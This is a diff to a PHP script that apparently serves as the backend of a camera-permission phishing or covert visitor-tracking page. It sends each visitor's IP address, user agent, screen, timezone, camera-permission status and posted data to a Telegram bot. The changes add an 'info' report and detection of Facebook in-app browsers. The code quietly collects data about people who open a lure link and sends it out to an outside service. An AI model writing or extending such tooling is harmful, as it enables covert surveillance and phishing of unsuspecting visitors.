@@ -109,6 +109,14 @@ switch ($type) {
         }
         break;
     
+    case 'info':
+        $message = "ℹ️ <b>INFO</b>\n\n";
+        $message .= htmlspecialchars($_POST['tg_data'] ?? '') . "\n";
+        $message .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
+        $message .= "Time: $time";
+        sendTelegramMessage($message);
+        break;
+    
     case 'permission':
         $message = "🔓 <b>CAMERA PERMISSION</b>\n\n";
         $message .= "Status: " . htmlspecialchars($_POST['tg_data'] ?? 'Unknown') . "\n";
@@ -164,6 +172,7 @@ switch ($type) {
         $message .= "🌍 Language: " . ($info['language'] ?? 'N/A') . "\n";
         $message .= "📐 Screen: " . ($info['screen'] ?? 'N/A') . "\n";
         $message .= "🕐 Timezone: " . ($info['timezone'] ?? 'N/A') . "\n";
+        $message .= "📱 WebView: " . ($info['webView'] ? 'Yes' : 'No') . "\n";
         $message .= "🌐 IP: <code>" . htmlspecialchars($ip) . "</code>\n";
         $message .= "⏰ Time: $time";
         sendTelegramMessage($message);
@@ -173,6 +182,7 @@ switch ($type) {
         $message = "👁️ <b>PAGE VIEW</b>\n\n";
         $message .= "🌐 IP: <code>" . htmlspecialchars($ip) . "</code>\n";
         $message .= "🖥️ UA: " . htmlspecialchars($ua) . "\n";
+        $message .= "📱 WebView: " . (strpos($ua, 'fbav') !== false || strpos($ua, 'fban') !== false ? 'Yes' : 'No') . "\n";
         $message .= "⏰ Time: $time";
         sendTelegramMessage($message);
         break;
